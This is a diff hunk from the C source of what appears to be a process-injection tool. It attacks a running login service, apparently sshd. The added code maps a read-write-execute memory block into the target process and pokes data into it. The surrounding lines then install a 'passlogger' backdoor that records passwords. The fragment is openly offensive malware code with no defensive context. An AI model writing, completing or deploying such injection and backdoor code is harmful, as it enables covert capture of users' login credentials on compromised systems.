@@ -240,6 +240,25 @@ int main(int argc, char *argv[]) {
 	u64 rexec_flag = inject_resolve_rexec(ctx);
 	info("rexec_flag\t\t\t= 0x%lx", rexec_flag); 
 
+	// install config memory block
+	ctx->config_addr = find_hole(ctx, rexec_flag, 0x1000);
+
+	info("allocating config memory @ 0x%lx", ctx->config_addr);
+
+	_mmap(
+		ctx, (void*)ctx->config_addr, 0x1000,
+		PROT_READ| PROT_WRITE | PROT_EXEC,
+		MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED,
+		0, 0
+	);
+
+	unsigned char null_buf[16];
+	memset(null_buf, 0, 16);
+
+	_poke(ctx->pid, ctx->config_addr, null_buf, 16);
+
+	inject_ctx_map_reload(ctx);
+
 	// install backdoor(s)
 	if(passlog_path != NULL) {
 		info("installing passlogger backdoor..");
